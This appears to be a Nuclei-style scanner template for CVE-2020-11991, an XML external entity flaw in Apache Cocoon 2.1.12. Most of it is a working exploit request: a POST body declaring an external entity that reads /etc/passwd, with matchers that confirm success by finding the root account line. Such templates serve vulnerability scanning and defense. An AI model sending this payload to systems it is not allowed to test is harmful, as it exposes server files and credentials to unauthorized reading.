id: cve-2020-11991
info:
  author: pikpikcu
  description: 'When using the StreamGenerator, the code parse a user-provided XML.
    A specially crafted XML, including external system entities, could be used to
    access any file on the server system.

    '
  name: Apache Cocoon 2.1.12 XML Injection
  reference: https://lists.apache.org/thread.html/r77add973ea521185e1a90aca00ba9dae7caa8d8b944d92421702bb54%40%3Cusers.cocoon.apache.org%3E
  severity: high
  tags: cve,cve2020,apache,xml,cocoon
requests:
- body: '<!--?xml version="1.0" ?-->

    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>

    <userInfo>

    <firstName>John</firstName>

    <lastName>&ent;</lastName>

    </userInfo>

    '
  headers:
    Content-type: text/xml
  matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/v2/api/product/manger/getInfo'
